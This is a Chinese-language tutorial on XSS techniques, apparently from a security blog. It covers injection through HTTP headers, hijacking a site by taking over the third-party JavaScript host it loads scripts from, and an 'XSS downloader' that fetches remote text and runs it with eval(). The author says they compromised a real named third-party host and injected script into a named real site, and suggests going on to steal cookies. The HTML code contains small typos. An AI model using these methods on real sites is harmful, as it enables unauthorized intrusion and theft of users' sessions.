# XSS技巧

## 01. 前言

遗留的问题

```
问1：只能更改IP么？
答1：不是，这里只是一个例子，大家需要发散思维。Referer User-Agent Cookie 等都可以的。
问2：我一个站也是http头部获取用户信息地方存在注入，可否xss？
答2：存在注入说明你把用户信息放到数据库里了，如果不显示前/后台显现用户信息，则不存在XSS。
```

## 02. 第三方劫持 (外调J/C)
本方法是我看长短短贴代码时知晓的，这篇文章我只是把这个攻击手法整理了出来，来说明这个漏洞，这个攻击手法并不是我发现的，我也不是太清楚是谁。“第三方劫持”就是把资源域的服务器的权限拿下，替换相关资源，采用‘迂回式’的渗透方式。

** PS ** ：J/C指的是javascript、css，其实还包括flash、etc、html等等，只是这个不经常使用而已，所以就不说了。

从字面上大家也可以猜出来，这是种什么攻击手法。名字里的"外调"不是从目标网站上插入新的J/C。而是在目标网站上找到不是本站的J/C。然后渗透那个网站，重写J/C。来达到渗透目标网站。

可是要怎么找到非本站的J/C呢？！不要担心， “长短短”已经写好相关的代码了，获取非本站的J/C。

```
for(var i=0,tags=document.querySelectorAll('iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'),tag;tag=tags[i];i++){
  var a = document.createElement('a');
  a.href = tag.src||tag.href||tag.data;
  if(a.hostname!=location.hostname){
    console.warn(location.hostname+' 发现第三方资源['+tag.localName+']:'+a.href);
  }
}
```

把这段输入在F12“审查元素”里”控制台”里，回车就OK。

OK，原理说完了。我们来个实例。

我们在http://www.zj4000.com/ 网站上使用上面的代码，获取到，其中有个www.xss8.pw的js。

![](/attackUsers/xss/image/xss-33.png)

那么我就渗透他试试，20分钟后…….好了，渗透完了。我们现在来重写JS，现在我们先测试下能不能用，我先在1.js里写上`alert(&#039;xss&#039;);`

![](/attackUsers/xss/image/xss-34.png)

现在，我们再来看看 www.zj4000.com 怎么样了。

![](/attackUsers/xss/image/xss-35.png)

看来，已经被成功调用了。我这里没有用css来说，因为js比较规范点，而且用css来实现我这上面的功能，同理SWF也可以实现上面的功能。我相信大家都会了，不需要我再多说什么了。

现在你已经掌握了一个可随时变化的储蓄xss，我们可以自己写个脚本，来获取目标的cookies。

这些我就不说了，我只是把这门冷门但是比较有潜力的攻击手法和大家说下。这个攻击手法比较有局限性，只要网站有着可以实现攻击环境， 那么的危害将会非常大。

想继续了解的可以看看黑哥写的WEBsec2-public.ppt

## 03 XSS downloader（XSS下载器）
此方法是由cnn4ry在《XSS跨站脚本攻击剖析与防御》里提起过。

这个技术其实就是把反射和储蓄结合起来，把核心代码写在网站上，然后以XSS触发并调用代码，实现攻击。

在《XSS跨转脚本攻击剖析与防御》里的代码不太正确，没有使用onreadystatechange的readyState来判断是否请求完成，也没有用status判断页面是否存在。导致没符合这几个条件的情况下就输出了，此时内容是空的，所以不会成功，我就自己写了一个ajax获取的。

下面是代码

```html
<html>
    <head>
        <title>ajax</title>
        <meta http-equiv="content-type" content="text/html;chaset=utf-8" />
    </head>
    
    <boby>
        <script>
            var xmlhttp;
            var request_text;
            if(window.XMLHttpRequest)
            {
                xmlhttp = new XMLHttpRequest();
            }
            else
            {
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            xmlhttp.onreadystatechange=function()
                                       {
                             if(xmlhttp.readyState==4 &&xmlhttp.status==200)
                             {
                                 request_text=xmlhttp.responseText;
                                 var a = request_text.indexOf("woaini")+6;
                                 var b = request_text.indexOf("niaiwo");
                                 eval(request_text.substring(a,b));
                             }
                                       }
            xmlhttp.open("POST","ajax.php","true");
            xmlhttp.send();
        </script>
    </boby>
</html>
```





